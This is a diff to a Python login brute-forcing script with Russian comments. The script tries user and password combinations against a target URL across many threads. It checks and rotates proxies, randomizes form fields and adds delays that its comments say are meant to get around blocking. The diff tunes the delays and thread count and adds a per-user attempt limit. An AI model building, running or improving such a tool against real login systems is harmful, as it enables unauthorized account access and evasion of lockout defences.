@@ -119,13 +119,14 @@ password_queue = []
 results_log = []
 
 def check_proxy(proxy):
-    """Проверяет работоспособность прокси."""
+    """Проверяет работоспособность прокси и возвращает True, если работает."""
     try:
         response = requests.get("http://httpbin.org/ip", proxies=proxy, timeout=5)
         if response.status_code == 200:
             return True
     except requests.RequestException:
         return False
+    return False
 
 def randomize_data(user, password):
     # Случайное добавление дополнительного поля
@@ -157,7 +158,7 @@ def request_with_retries(url, user, password, retries=3):
         except requests.RequestException as e:
             logging.warning(f"Error: {e} (Attempt {attempt + 1}/{retries})")
             if attempt < retries - 1:
-                time.sleep(random.uniform(0.5, 1.5))  # Задержка для обхода блокировки
+                time.sleep(random.uniform(1, 2))  # Задержка для обхода блокировки
             continue
     return False
 
@@ -205,7 +206,10 @@ def main():
     user_queue.extend(users)
     password_queue.extend(passwords)
 
-    max_threads = 10  # Увеличение количества потоков
+    max_threads = 5  # Увеличение количества потоков
+
+    # Ограничение на количество попыток для каждого user:password
+    attempts_limit = 5
 
     # Случайный порядок запросов
     random.shuffle(user_queue)
@@ -213,8 +217,8 @@ def main():
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = [
-            executor.submit(brute_force, args.url, user, password)
-            for user in user_queue for password in password_queue
+            executor.submit(brute_force, args.url, user, password, attempts_limit)
+            for user in user_queue for password in password_queue[:attempts_limit]  # Лимит на количество попыток
         ]
 
         for future in as_completed(futures):
